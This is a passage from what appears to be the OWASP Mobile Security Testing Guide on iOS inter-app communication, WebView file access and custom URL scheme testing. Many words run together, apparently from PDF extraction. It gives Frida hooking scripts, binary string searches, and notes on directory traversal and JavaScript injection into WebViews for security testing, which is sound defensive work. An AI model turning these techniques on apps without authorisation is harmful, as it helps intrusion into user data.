opentheresourcespecifiedbytheURL. MoreinformationcanbefoundinthearchivedAppProgrammingGuideforiOSandintheAppleSecureCodingGuide. Inaddition,anappmayalsowanttosendURLrequests(aka. queries)tootherapps. Thisisdoneby: • registeringtheapplicationqueryschemesthattheappwantstoquery, • optionallyqueryingotherappstoknowiftheycanopenacertainURL, • sendingtheURLrequests. Universal Links UniversallinksaretheiOSequivalenttoAndroidAppLinks(aka. DigitalAssetLinks)andareusedfordeeplinking. When tappingauniversallink(totheapp’swebsite),theuserwillseamlesslyberedirectedtothecorrespondinginstalledapp withoutgoingthroughSafari. Iftheappisn’tinstalled,thelinkwillopeninSafari. Universallinksarestandardweblinks(HTTP/HTTPS)andarenottobeconfusedwithcustomURLschemes,whichoriginally werealsousedfordeeplinking. Forexample,theTelegramappsupportsbothcustomURLschemesanduniversallinks: • tg://resolve?domain=fridadotreisacustomURLschemeandusesthetg://scheme. • https://telegram.me/fridadotreisauniversallinkandusesthehttps://scheme. Both result in the same action, the user will be redirected to the specified chat in Telegram (“fridadotre” in this case). However,universallinksgiveseveralkeybenefitsthatarenotapplicablewhenusingcustomURLschemesandarethe recommendedwaytoimplementdeeplinking,accordingtotheAppleDeveloperDocumentation. Specifically,universal linksare: • Unique: UnlikecustomURLschemes,universallinkscan’tbeclaimedbyotherapps,becausetheyusestandard HTTPorHTTPSlinkstotheapp’swebsite. TheywereintroducedasawaytopreventURLschemehijackingattacks (anappinstalledaftertheoriginalappmaydeclarethesameschemeandthesystemmighttargetallnewrequests tothelastinstalledapp). • Secure: Whenusersinstalltheapp,iOSdownloadsandchecksafile(theAppleAppSiteAssociationorAASA)that wasuploadedtothewebservertomakesurethatthewebsiteallowstheapptoopenURLsonitsbehalf. Onlythe legitimateownersoftheURLcanuploadthisfile,sotheassociationoftheirwebsitewiththeappissecure. • Flexible: Universal links work even when the app is not installed. Tapping a link to the website would open the contentinSafari,asusersexpect. • Simple: OneURLworksforboththewebsiteandtheapp. • Private: Otherappscancommunicatewiththeappwithoutneedingtoknowwhetheritisinstalled. YoucanlearnmoreaboutUniversalLinksinthepost“LearningaboutUniversalLinksandFuzzingURLSchemesoniOS withFrida”byCarlosHolguera. UIActivity Sharing StartingoniOS6itispossibleforthird-partyappstosharedata(items)viaspecificmechanismslikeAirDrop,forexample. Fromauserperspective,thisfeatureisthewell-knownsystem-wide“ShareActivitySheet”thatappearsafterclickingon the“Share”button. 447\nTheavailablebuilt-insharingmechanisms(aka. ActivityTypes)include: • airDrop • assignToContact • copyToPasteboard • mail • message • postToFacebook • postToTwitter A full list can be found in UIActivity.ActivityType. If not considered appropriate for the app, the developers have the possibilitytoexcludesomeofthesesharingmechanisms. App extensions TogetherwithiOS8,AppleintroducedAppExtensions. AccordingtoAppleAppExtensionProgrammingGuide,appexten- sionsletappsoffercustomfunctionalityandcontenttouserswhilethey’reinteractingwithotherappsorthesystem. In ordertodothis,theyimplementspecific,wellscopedtaskslike,forexample,definewhathappensaftertheuserclickson the“Share”buttonandselectssomeapporaction,providethecontentforaTodaywidgetorenableacustomkeyboard. Dependingonthetask,theappextensionwillhaveaparticulartype(andonlyone),theso-calledextensionpoints. Some notableonesare: • CustomKeyboard: replacestheiOSsystemkeyboardwithacustomkeyboardforuseinallapps. • Share: posttoasharingwebsiteorsharecontentwithothers. • Today: alsocalledwidgets,theyoffercontentorperformquicktasksintheTodayviewofNotificationCenter. How do app extensions interact with other apps Therearethreeimportantelementshere: • Appextension: istheonebundledinsideacontainingapp. Hostappsinteractwithit. • Hostapp: isthe(third-party)appthattriggerstheappextensionofanotherapp. • Containingapp: istheappthatcontainstheappextensionbundledintoit. 448\nForexample,theuserselectstextinthehostapp,clicksonthe“Share”buttonandselectsone“app”oractionfromthe list. Thistriggerstheappextensionofthecontainingapp. Theappextensiondisplaysitsviewwithinthecontextofthe hostappandusestheitemsprovidedbythehostapp,theselectedtextinthiscase,toperformaspecifictask(postit onasocialnetwork,forexample). SeethispicturefromtheAppleAppExtensionProgrammingGuidewhichprettygood summarizesthis: Security Considerations Fromthesecuritypointofviewitisimportanttonotethat: • Anappextensiondoesnevercommunicatedirectlywithitscontainingapp(typically,itisn’tevenrunningwhilethe containedappextensionisrunning). • Anappextensionandthehostappcommunicateviainter-processcommunication. • Anappextension’scontainingappandthehostappdon’tcommunicateatall. • A Today widget (and no other app extension type) can ask the system to open its containing app by calling the openURL:completionHandler: methodoftheNSExtensionContextclass. • Anyappextensionanditscontainingappcanaccessshareddatainaprivatelydefinedsharedcontainer. Inaddition: • AppextensionscannotaccesssomeAPIs,forexample,HealthKit. • TheycannotreceivedatausingAirDropbutdocansenddata. • Nolong-runningbackgroundtasksareallowedbutuploadsordownloadscanbeinitiated. • AppextensionscannotaccessthecameraormicrophoneonaniOSdevice(exceptforiMessageappextensions). UIPasteboard Whentypingdataintoinputfields,theclipboardcanbeusedtocopyindata. Theclipboardisaccessiblesystem-wideand isthereforesharedbyapps. Thissharingcanbemisusedbymaliciousappstogetsensitivedatathathasbeenstoredin theclipboard. Whenusinganappyoushouldbeawarethatotherappsmightbereadingtheclipboardcontinuously,astheFacebook app did. Before iOS 9, a malicious app might monitor the pasteboard in the background while periodically retrieving [UIPasteboard generalPasteboard].string. AsofiOS9, pasteboardcontentisaccessibletoappsintheforeground only,whichreducestheattacksurfaceofpasswordsniffingfromtheclipboarddramatically. Still,copy-pastingpasswords isasecurityriskyoushouldbeawareof,butalsocannotbesolvedbyanapp. • Preventingpastingintoinputfieldsofanapp,doesnotpreventthatauserwillcopysensitiveinformationanyway. Sincetheinformationhasalreadybeencopiedbeforetheusernoticesthatit’snotpossibletopasteitin,amalicious apphasalreadysniffedtheclipboard. • Ifpastingisdisabledonpasswordfieldsusersmightevenchooseweakerpasswordsthattheycanrememberand they cannot use password managers anymore, which would contradict the original intention of making the app moresecure. The UIPasteboard enables sharing data within an app, and from an app to other apps. There are two kinds of paste- boards: 449\n• systemwide general pasteboard: for sharing data with any app. Persistent by default across device restarts andappuninstalls(sinceiOS10). • custom/namedpasteboards: forsharingdatawithanotherapp(havingthesameteamIDastheapptoshare from) or with the app itself (they are only available in the process that creates them). Non-persistent by default (sinceiOS10),thatis,theyexistonlyuntiltheowning(creating)appquits. SecurityConsiderations: • Userscannotgrantordenypermissionforappstoreadthepasteboard. • SinceiOS9,appscannotaccessthepasteboardwhileinbackground,thismitigatesbackgroundpasteboardmoni- toring. However,ifthemaliciousappisbroughttoforegroundagainandthedataremainsinthepasteboard,itwill beabletoretrieveitprogrammaticallywithouttheknowledgenortheconsentoftheuser. • Applewarnsaboutpersistentnamedpasteboardsanddiscouragestheiruse. Instead,sharedcontainersshouldbe used. • Starting in iOS 10 there is a new Handoff feature called Universal Clipboard that is enabled by default. It allows the general pasteboard contents to automatically transfer between devices. This feature can be disabled if the developerchoosestodosoanditisalsopossibletosetanexpirationtimeanddateforcopieddata. Testing WebView Protocol Handlers Platform: ios MASVSV1: MSTG-PLATFORM-6 MASVSV2: MASVS-PLATFORM-2 Overview Static Analysis • TestinghowWebViewsareloaded • TestingWebViewfileaccess • Checkingtelephonenumberdetection Testing How WebViews are Loaded IfaWebViewisloadingcontentfromtheappdatadirectory,usersshouldnotbeabletochangethefilenameorpathfrom whichthefileisloaded,andtheyshouldn’tbeabletoedittheloadedfile. This presents an issue especially in UIWebViews loading untrusted content via the deprecated methods loadHTML- String:baseURL:orloadData:MIMEType:textEncodingName: baseURL: andsettingthebaseURLparametertonilor toafile: orapplewebdata: URLschemes. Inthiscase,inordertopreventunauthorizedaccesstolocalfiles,thebest optionistosetitinsteadtoabout:blank. However,therecommendationistoavoidtheuseofUIWebViewsandswitch toWKWebViewsinstead. Here’sanexampleofavulnerableUIWebViewfrom“Where’sMyBrowser?”: letscenario2HtmlPath=Bundle.main.url(forResource:"web/UIWebView/scenario2.html",withExtension:nil) do{ letscenario2Html=tryString(contentsOf:scenario2HtmlPath!,encoding:.utf8) uiWebView.loadHTMLString(scenario2Html,baseURL:nil) }catch{} ThepageloadsresourcesfromtheinternetusingHTTP,enablingapotentialMITMtoexfiltratesecretscontainedinlocal files,e.g.insharedpreferences. WhenworkingwithWKWebViews,ApplerecommendsusingloadHTMLString:baseURL:orloadData:MIMEType:textEncodingName:baseURL: to load local HTML files and loadRequest: for web content. Typically, the local files are loaded in combina- tion with methods including, among others: pathForResource:ofType:, URLForResource:withExtension: or init(contentsOf:encoding:). 450\nSearchthesourcecodeforthementionedmethodsandinspecttheirparameters. ExampleinObjective-C: -(void)viewDidLoad { [super viewDidLoad]; WKWebViewConfiguration *configuration =[[WKWebViewConfigurationalloc]init]; self.webView =[[WKWebViewalloc]initWithFrame:CGRectMake(10,20, CGRectGetWidth([UIScreenmainScreen].bounds)-20, CGRectGetHeight([UIScreenmainScreen].bounds)-84)configuration:configuration]; self.webView.navigationDelegate =self; [self.viewaddSubview:self.webView]; NSString *filePath =[[NSBundlemainBundle]pathForResource:@"example_file" ofType:@"html"]; NSString *html =[NSStringstringWithContentsOfFile:filePath encoding:NSUTF8StringEncodingerror:nil]; [self.webViewloadHTMLString:htmlbaseURL:[NSBundlemainBundle].resourceURL]; } ExampleinSwiftfrom“Where’sMyBrowser?”: letscenario2HtmlPath=Bundle.main.url(forResource:"web/WKWebView/scenario2.html",withExtension:nil) do{ letscenario2Html=tryString(contentsOf:scenario2HtmlPath!,encoding:.utf8) wkWebView.loadHTMLString(scenario2Html,baseURL:nil) }catch{} Ifonlyhavingthecompiledbinary,youcanalsosearchforthesemethods,e.g.: $rabin2 -zz./WheresMyBrowser |grep -i"loadHTMLString" 2310x0002df6c24 (4.__TEXT.__objc_methname)asciiloadHTMLString:baseURL: Inacaselikethis,itisrecommendedtoperformdynamicanalysistoensurethatthisisinfactbeingusedandfromwhich kindofWebView. ThebaseURLparameterheredoesn’tpresentanissueasitwillbesetto“null”butcouldbeanissueif notsetproperlywhenusingaUIWebView. See“CheckingHowWebViewsareLoaded”foranexampleaboutthis. In addition, you should also verify if the app is using the method loadFileURL: allowingReadAccessToURL:. Its first parameterisURLandcontainstheURLtobeloadedintheWebView, itssecondparameterallowingReadAccessToURL maycontainasinglefileoradirectory. Ifcontainingasinglefile,thatfilewillbeavailabletotheWebView. However,if itcontainsadirectory,allfilesonthatdirectorywillbemadeavailabletotheWebView. Therefore,itisworthinspecting thisandincaseitisadirectory,verifyingthatnosensitivedatacanbefoundinsideit. ExampleinSwiftfrom“Where’sMyBrowser?”: varscenario1Url=FileManager.default.urls(for:.libraryDirectory,in:.userDomainMask)[0] scenario1Url=scenario1Url.appendingPathComponent("WKWebView/scenario1.html") wkWebView.loadFileURL(scenario1Url,allowingReadAccessTo:scenario1Url) Inthiscase,theparameterallowingReadAccessToURLcontainsasinglefile“WKWebView/scenario1.html”,meaningthat theWebViewhasexclusivelyaccesstothatfile. Inthecompiledbinary: $rabin2 -zz./WheresMyBrowser |grep -i"loadFileURL" 2370x0002dff137 (4.__TEXT.__objc_methname)asciiloadFileURL:allowingReadAccessToURL: Testing WebView File Access IfyouhavefoundaUIWebViewbeingused,thenthefollowingapplies: • Thefile://schemeisalwaysenabled. • Fileaccessfromfile://URLsisalwaysenabled. • Universalaccessfromfile://URLsisalwaysenabled. RegardingWKWebViews: 451\n• Thefile://schemeisalsoalwaysenabledanditcannotbedisabled. • Itdisablesfileaccessfromfile://URLsbydefaultbutitcanbeenabled. ThefollowingWebViewpropertiescanbeusedtoconfigurefileaccess: • allowFileAccessFromFileURLs(WKPreferences, falsebydefault): itenablesJavaScriptrunninginthecontext ofafile://schemeURLtoaccesscontentfromotherfile://schemeURLs. • allowUniversalAccessFromFileURLs(WKWebViewConfiguration,falsebydefault): itenablesJavaScriptrunning inthecontextofafile://schemeURLtoaccesscontentfromanyorigin. Forexample,itispossibletosettheundocumentedpropertyallowFileAccessFromFileURLsbydoingthis: Objective-C: [webView.configuration.preferencessetValue:@YESforKey:@"allowFileAccessFromFileURLs"]; Swift: webView.configuration.preferences.setValue(true,forKey:"allowFileAccessFromFileURLs") Ifoneormoreoftheabovepropertiesareactivated,youshoulddeterminewhethertheyarereallynecessaryfortheapp toworkproperly. Checking Telephone Number Detection In Safari on iOS, telephone number detection is on by default. However, you might want to turn it off if your HTML pagecontainsnumbersthatcanbeinterpretedasphonenumbers,butarenotphonenumbers,ortopreventtheDOM documentfrombeingmodifiedwhenparsedbythebrowser. ToturnofftelephonenumberdetectioninSafarioniOS,use theformat-detectionmetatag(<meta name = "format-detection" content = "telephone=no">). Anexampleofthis canbefoundintheAppledeveloperdocumentation. Phonelinksshouldbethenused(e.g.<a href="tel:1-408-555- 5555">1-408-555-5555</a>)toexplicitlycreatealink. Dynamic Analysis If it’s possible to load local files via a WebView, the app might be vulnerable to directory traversal attacks. This would allowaccesstoallfileswithinthesandboxoreventoescapethesandboxwithfullaccesstothefilesystem(ifthedevice isjailbroken). Itshouldthereforebeverifiedifausercanchangethefilenameorpathfromwhichthefileisloaded,and theyshouldn’tbeabletoedittheloadedfile. Tosimulateanattack,youmayinjectyourownJavaScriptintotheWebViewwithaninterceptionproxyorsimplybyusing dynamicinstrumentation. Attempttoaccesslocalstorageandanynativemethodsandpropertiesthatmightbeexposed totheJavaScriptcontext. Inareal-worldscenario,JavaScriptcanonlybeinjectedthroughapermanentbackendCross-SiteScriptingvulnerability oraMITMattack. SeetheOWASPXSSPreventionCheatSheetandthechapter“iOSNetworkCommunication”formore information. Forwhatconcernsthissectionwewilllearnabout: • CheckinghowWebViewsareloaded • DeterminingWebViewfileaccess Checking How WebViews are Loaded Aswehaveseenabovein“TestingHowWebViewsareLoaded”,if“scenario2”oftheWKWebViewsisloaded,theappwill dosobycallingURLForResource:withExtension: andloadHTMLString:baseURL. Toquicklyinspectthis,youcanusefrida-traceandtraceall“loadHTMLString”and“URLForResource:withExtension:” meth- ods. 452\n$frida-trace -U"Where'sMyBrowser?" -m"*[WKWebView*loadHTMLString*]" -m"*[*URLForResource:withExtension:]" 14131ms -[NSBundle URLForResource:0x1c0255390withExtension:0x0] 14131ms URLForResource:web/WKWebView/scenario2.html 14131ms withExtension:0x0 14190ms -[WKWebView loadHTMLString:0x1c0255390baseURL:0x0] 14190ms HTMLString: <!DOCTYPEhtml> <html> ... </html> 14190ms baseURL:nil In this case, baseURL is set to nil, meaning that the effective origin is “null”. You can obtain the effective origin by running window.origin from the JavaScript of the page (this app has an exploitation helper that allows to write and run JavaScript, but you could also implement a MITM or simply use Frida to inject JavaScript, e.g. via evaluate- JavaScript:completionHandlerofWKWebView). AsanadditionalnoteregardingUIWebViews,ifyouretrievetheeffectiveoriginfromaUIWebViewwherebaseURLisalso settonilyouwillseethatitisnotsetto“null”,insteadyou’llobtainsomethingsimilartothefollowing: applewebdata://5361016c-f4a0-4305-816b-65411fc1d780 Thisorigin“applewebdata://”issimilartothe“file://”originasitdoesnotimplementSame-OriginPolicyandallowaccess to local files and any web resources. In this case, it would be better to set baseURL to “about:blank”, this way, the Same-OriginPolicywouldpreventcross-originaccess. However,therecommendationhereistocompletelyavoidusing UIWebViewsandgoforWKWebViewsinstead. Determining WebView File Access Evenifnothavingtheoriginalsourcecode,youcanquicklydetermineiftheapp’sWebViewsdoallowfileaccessandwhich kind. Forthis,simplynavigatetothetargetWebViewintheappandinspectallitsinstances,foreachofthemgetthevalues mentionedinthestaticanalysis,thatis,allowFileAccessFromFileURLsandallowUniversalAccessFromFileURLs. This onlyappliestoWKWebViews(UIWebVIewsalwaysallowfileaccess). Wecontinuewithourexampleusingthe“Where’sMyBrowser?” appandFridaREPL,extendthescriptwiththefollowing content: ObjC.choose(ObjC.classes['WKWebView'],{ onMatch:function (wk){ console.log('onMatch:',wk); console.log('URL:',wk.URL().toString()); console.log('javaScriptEnabled:',wk.configuration().preferences().javaScriptEnabled()); console.log('allowFileAccessFromFileURLs:', wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString()); console.log('hasOnlySecureContent:',wk.hasOnlySecureContent().toString()); console.log('allowUniversalAccessFromFileURLs:', wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString()); }, onComplete:function (){ console.log('doneforWKWebView!'); } }); Ifyourunitnow,you’llhavealltheinformationyouneed: $frida -U-fcom.authenticationfailure.WheresMyBrowser -lwebviews_inspector.js onMatch: <WKWebView:0x1508b1200;frame =(00;320393);layer =<CALayer: 0x1c4238f20>> URL: file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/ Library/WKWebView/scenario1.html javaScriptEnabled: true allowFileAccessFromFileURLs: 0 hasOnlySecureContent: false allowUniversalAccessFromFileURLs: 0 Both allowFileAccessFromFileURLs and allowUniversalAccessFromFileURLs are set to “0”, meaning that they are disabled. InthisappwecangototheWebViewconfigurationandenableallowFileAccessFromFileURLs. Ifwedoso andre-runthescriptwewillseehowitissetto“1”thistime: 453\n$frida -U-fcom.authenticationfailure.WheresMyBrowser -lwebviews_inspector.js ... allowFileAccessFromFileURLs: 1 Testing App Extensions Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis Thestaticanalysiswilltakecareof: • Verifyingiftheappcontainsappextensions • Determiningthesupporteddatatypes • Checkingdatasharingwiththecontainingapp • Verifyingiftheapprestrictstheuseofappextensions Verifying if the App Contains App Extensions If you have the original source code you can search for all occurrences of NSExtensionPointIdentifier with Xcode (cmd+shift+f)ortakealookinto“BuildPhases/EmbedAppextensions”: Thereyoucanfindthenamesofallembeddedappextensionsfollowedby.appex,nowyoucannavigatetotheindividual appextensionsintheproject. Ifnothavingtheoriginalsourcecode: GrepforNSExtensionPointIdentifieramongallfilesinsidetheappbundle(IPAorinstalledapp): $grep -nrNSExtensionPointIdentifierPayload/Telegram\X.app/ BinaryfilePayload/TelegramX.app//PlugIns/SiriIntents.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//PlugIns/Share.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//PlugIns/NotificationContent.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//PlugIns/Widget.appex/Info.plistmatches BinaryfilePayload/TelegramX.app//Watch/Watch.app/PlugIns/WatchExtension.appex/Info.plistmatches YoucanalsoaccessperSSH,findtheappbundleandlistallinsidePlugIns(theyareplacedtherebydefault)ordoitwith objection: 454\nph.telegra.Telegraphon (iPhone:11.1.2)[usb] #cdPlugIns /var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/ TelegramX.app/PlugIns ph.telegra.Telegraphon (iPhone:11.1.2)[usb] #ls NSFileType Perms NSFileProtection Read Write Name ##TestingiOSWebViews >**Platform:**ios > >**MASVSV1:**MSTG-PLATFORM-5 > >**MASVSV2:**MASVS-PLATFORM-2 ###Overview ###StaticAnalysis Forthestaticanalysiswewillfocusmostlyonthefollowingpointshaving `UIWebView`and`WKWebView`underscope. -IdentifyingWebViewusage -TestingJavaScriptconfiguration -Testingformixedcontent -TestingforWebViewURImanipulation ####IdentifyingWebViewUsage LookoutforusagesoftheabovementionedWebViewclassesbysearchinginXcode. Inthecompiledbinaryyoucansearchinitssymbolsorstringslikethis: #####UIWebView ```bash $rabin2 -zz./WheresMyBrowser |egrep "UIWebView$" 4890x0002fee90x10002fee9 9 10 (5.__TEXT.__cstring)asciiUIWebView 8960x0003c8130x0003c813 24 25 ()ascii@_OBJC_CLASS_$_UIWebView 17540x000595990x00059599 23 24 ()ascii_OBJC_CLASS_$_UIWebView WKWebView $rabin2 -zz./WheresMyBrowser |egrep "WKWebView$" 4900x0002fef30x10002fef3 9 10 (5.__TEXT.__cstring)asciiWKWebView 6250x000316700x100031670 17 18 (5.__TEXT.__cstring)asciiunwindToWKWebView 9040x0003c9600x0003c960 24 25 ()ascii@_OBJC_CLASS_$_WKWebView 17570x000595e40x000595e4 23 24 ()ascii_OBJC_CLASS_$_WKWebView AlternativelyyoucanalsosearchforknownmethodsoftheseWebViewclasses. Forexample,searchforthemethodused toinitializeaWKWebView(init(frame:configuration:)): $rabin2 -zzq ./WheresMyBrowser |egrep "WKWebView.*frame" 0x5c3ac7776__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC 0x5d97a7978__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO 0x6b5d57776__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC 0x6c3fa7978__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO Youcanalsodemangleit: $xcrunswift-demangle__T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO --->@nonobjc__C.WKWebView.init(frame:__C_Synthesized.CGRect, configuration:__C.WKWebViewConfiguration)-> __C.WKWebView Testing Custom URL Schemes Platform: ios MASVSV1: MSTG-PLATFORM-3 MASVSV2: MASVS-PLATFORM-1 455\nOverview Static Analysis Thereareacoupleofthingsthatwecandousingstaticanalysis. Inthenextsectionswewillseethefollowing: • TestingcustomURLschemesregistration • Testingapplicationqueryschemesregistration • TestingURLhandlingandvalidation • TestingURLrequeststootherapps • Testingfordeprecatedmethods Testing Custom URL Schemes Registration ThefirststeptotestcustomURLschemesisfindingoutwhetheranapplicationregistersanyprotocolhandlers. Ifyouhavetheoriginalsourcecodeandwanttoviewregisteredprotocolhandlers,simplyopentheprojectinXcode,go totheInfotabandopentheURLTypessectionaspresentedinthescreenshotbelow: AlsoinXcodeyoucanfindthisbysearchingfortheCFBundleURLTypeskeyintheapp’sInfo.plistfile(examplefrom iGoat-Swift): <key>CFBundleURLTypes</key> <array> <dict> <key>CFBundleURLName</key> <string>com.iGoat.myCompany</string> <key>CFBundleURLSchemes</key> <array> <string>iGoat</string> </array> </dict> </array> Inacompiledapplication(orIPA),registeredprotocolhandlersarefoundinthefileInfo.plistintheappbundle’sroot folder. OpenitandsearchfortheCFBundleURLSchemeskey,ifpresent,itshouldcontainanarrayofstrings(examplefrom iGoat-Swift): grep-A5-nriurlschInfo.plist Info.plist:45: <key>CFBundleURLSchemes</key> Info.plist-46- <array> Info.plist-47- <string>iGoat</string> Info.plist-48- </array> OncetheURLschemeisregistered,otherappscanopentheappthatregisteredthescheme,andpassparametersbycre- atingappropriatelyformattedURLsandopeningthemwiththeUIApplication openURL:options:completionHandler: method. NotefromtheAppProgrammingGuideforiOS: Ifmorethanonethird-partyappregisterstohandlethesameURLscheme,thereiscurrentlynoprocessfordeter- miningwhichappwillbegiventhatscheme. ThiscouldleadtoaURLschemehijackingattack(seepage136in[#thiel2]). 456\nTesting Application Query Schemes Registration BeforecallingtheopenURL:options:completionHandler: method,appscancallcanOpenURL:toverifythatthetarget appisavailable. However,asthismethodwasbeingusedbymaliciousappasawaytoenumerateinstalledapps,from iOS 9.0 the URL schemes passed to it must be also declared by adding the LSApplicationQueriesSchemes key to the app’sInfo.plistfileandanarrayofupto50URLschemes. <key>LSApplicationQueriesSchemes</key> <array> <string>url_scheme1</string> <string>url_scheme2</string> </array> canOpenURLwillalwaysreturnNOforundeclaredschemes,whetherornotanappropriateappisinstalled. However,this restrictiononlyappliestocanOpenURL. TheopenURL:options:completionHandler: methodwillstillopenanyURLscheme,eveniftheLSApplication- QueriesSchemesarraywasdeclared,andreturnYES/NOdependingontheresult. Asanexample,TelegramdeclaresinitsInfo.plisttheseQueriesSchemes,amongothers: <key>LSApplicationQueriesSchemes</key> <array> <string>dbapi-3</string> <string>instagram</string> <string>googledrive</string> <string>comgooglemaps-x-callback</string> <string>foursquare</string> <string>here-location</string> <string>yandexmaps</string> <string>yandexnavi</string> <string>comgooglemaps</string> <string>youtube</string> <string>twitter</string> ... Testing URL Handling and Validation InordertodeterminehowaURLpathisbuiltandvalidated,ifyouhavetheoriginalsourcecode,youcansearchforthe followingmethods: • application:didFinishLaunchingWithOptions:methodorapplication:will-FinishLaunchingWithOptions:: verifyhowthedecisionismadeandhowtheinformationabouttheURLisretrieved. • application:openURL:options:: verifyhowtheresourceisbeingopened,i.e.howthedataisbeingparsed,verify theoptions,especiallyifaccessbythecallingapp(sourceApplication)shouldbeallowedordenied. Theappmight alsoneeduserpermissionwhenusingthecustomURLscheme. InTelegramyouwillfindfourdifferentmethodsbeingused: funcapplication(_application:UIApplication,openurl:URL,sourceApplication:String?)->Bool{ self.openUrl(url:url) returntrue } funcapplication(_application:UIApplication,openurl:URL,sourceApplication:String?, annotation:Any)->Bool{ self.openUrl(url:url) returntrue } funcapplication(_app:UIApplication,openurl:URL, options:[UIApplicationOpenURLOptionsKey:Any]=[:])->Bool{ self.openUrl(url:url) returntrue } funcapplication(_application:UIApplication,handleOpenurl:URL)->Bool{ self.openUrl(url:url) returntrue } Wecanobservesomethingshere: • Theappimplementsalsodeprecatedmethodslikeapplication:handleOpenURL:andapplication:openURL:sourceApplication:annotation:. • Thesourceapplicationisnotbeingverifiedinanyofthosemethods. • AllofthemcallaprivateopenUrlmethod. YoucaninspectittolearnmoreabouthowtheURLrequestishandled. 457\nTesting URL Requests to Other Apps The method openURL:options:completionHandler: and the deprecated openURL: method of UIApplication are re- sponsibleforopeningURLs(i.e.tosendrequests/makequeriestootherapps)thatmaybelocaltothecurrentappor itmaybeonethatmustbeprovidedbyadifferentapp. Ifyouhavetheoriginalsourcecodeyoucansearchdirectlyfor usagesofthosemethods. Additionally,ifyouareinterestedintoknowingiftheappisqueryingspecificservicesorapps,andiftheappiswell-known, youcanalsosearchforcommonURLschemesonlineandincludetheminyourgreps. Forexample,aquickGooglesearch reveals: AppleMusic-music://ormusics://oraudio-player-event:// Calendar-calshow://orx-apple-calevent:// Contacts-contacts:// Diagnostics-diagnostics://ordiags:// GarageBand-garageband:// iBooks-ibooks://oritms-books://oritms-bookss:// Mail-message://ormailto://emailaddress Messages-sms://phonenumber Notes-mobilenotes:// ... WesearchforthismethodintheTelegramsourcecode,thistimewithoutusingXcode,justwithegrep: $egrep -nr"open.*options.*completionHandler" ./Telegram-iOS/ ./AppDelegate.swift:552:returnUIApplication.shared.open(parsedUrl, options:[UIApplicationOpenURLOptionUniversalLinksOnly:trueasNSNumber], completionHandler:{valuein ./AppDelegate.swift:556:returnUIApplication.shared.open(parsedUrl, options:[UIApplicationOpenURLOptionUniversalLinksOnly:trueasNSNumber], completionHandler:{valuein If we inspect the results we will see that openURL:options:completionHandler: is actually being used for universal links,sowehavetokeepsearching. Forexample,wecansearchforopenURL(: $egrep -nr"openURL\(" ./Telegram-iOS/ ./ApplicationContext.swift:763: UIApplication.shared.openURL(parsedUrl) ./ApplicationContext.swift:792: UIApplication.shared.openURL(URL( string: "https://telegram.org/deactivate?phone=\(phone)")! ) ./AppDelegate.swift:423: UIApplication.shared.openURL(url) ./AppDelegate.swift:538: UIApplication.shared.openURL(parsedUrl) ... If we inspect those lines we will see how this method is also being used to open “Settings” or to open the “App Store Page”. Whenjustsearchingfor://wesee: ifdocumentUri.hasPrefix("file://"),letpath=URL(string:documentUri)?.path{ if!url.hasPrefix("mt-encrypted-file://?"){ guardletdict=TGStringUtils.argumentDictionary(inUrlString:String(url[url.index(url.startIndex, offsetBy:"mt-encrypted-file://?".count)...]))else{ parsedUrl=URL(string:"https://\(url)") ifleturl=URL(string:"itms-apps://itunes.apple.com/app/id\(appStoreId)"){ }elseifleturl=urlas?String,url.lowercased().hasPrefix("tg://"){ [[WKExtensionsharedExtension]openSystemURL:[NSURLURLWithString:[NSString stringWithFormat:@"tel://%@",userHandle.data]]]; Aftercombiningtheresultsofbothsearchesandcarefullyinspectingthesourcecodewefindthefollowingpieceofcode: openUrl:{urlin varparsedUrl=URL(string:url) ifletparsed=parsedUrl{ ifparsed.scheme==nil||parsed.scheme!.isEmpty{ parsedUrl=URL(string:"https://\(url)") } ifparsed.scheme=="tg"{ return } } ifletparsedUrl=parsedUrl{ UIApplication.shared.openURL(parsedUrl) 458\nBeforeopeningaURL,theschemeisvalidated,“https”willbeaddedifnecessaryanditwon’topenanyURLwiththe“tg” scheme. WhenreadyitwillusethedeprecatedopenURLmethod. Ifonlyhavingthecompiledapplication(IPA)youcanstilltrytoidentifywhichURLschemesarebeingusedtoqueryother apps: • CheckifLSApplicationQueriesSchemeswasdeclaredorsearchforcommonURLschemes. • Alsousethestring://orbuildaregularexpressiontomatchURLsastheappmightnotbedeclaringsomeschemes. Youcandothatbyfirstverifyingthattheappbinarycontainsthosestringsbye.g.usingunixstringscommand: strings <yourapp>|grep "someURLscheme://" orevenbetter,useradare2’siz/izzcommandorrafind2,bothwillfindstringswheretheunixstringscommandwon’t. ExamplefromiGoat-Swift: $r2 -qcizz~iGoat://iGoat-Swift 374360x001ee6100x001ee610 23 24 (4.__TEXT.__cstring)asciiiGoat://?contactNumber= Testing for Deprecated Methods Searchfordeprecatedmethodslike: • application:handleOpenURL: • openURL: • application:openURL:sourceApplication:annotation: Forexample,herewefindthosethree: $rabin2 -zzq Telegram\X.app/Telegram\X |grep -i"openurl" 0x1000d9e903130UIApplicationOpenURLOptionsKey 0x1000dee3f5049application:openURL:sourceApplication:annotation: 0x1000dee712928application:openURL:options: 0x1000dee8e2726application:handleOpenURL: 0x1000df2c998openURL: 0x1000df7661211canOpenURL: 0x1000df7723534openURL:options:completionHandler: ... Dynamic Analysis Onceyou’veidentifiedthecustomURLschemestheapphasregistered,thereareseveralmethodsthatyoucanuseto testthem: • PerformingURLrequests • IdentifyingandhookingtheURLhandlermethod • TestingURLschemessourcevalidation • FuzzingURLschemes Performing URL Requests Using Safari ToquicklytestoneURLschemeyoucanopentheURLsonSafariandobservehowtheappbehaves. Forexample,ifyou write tel://123456789 in the address bar of Safari, a pop up will appear with the telephone number and the options “Cancel”and“Call”. 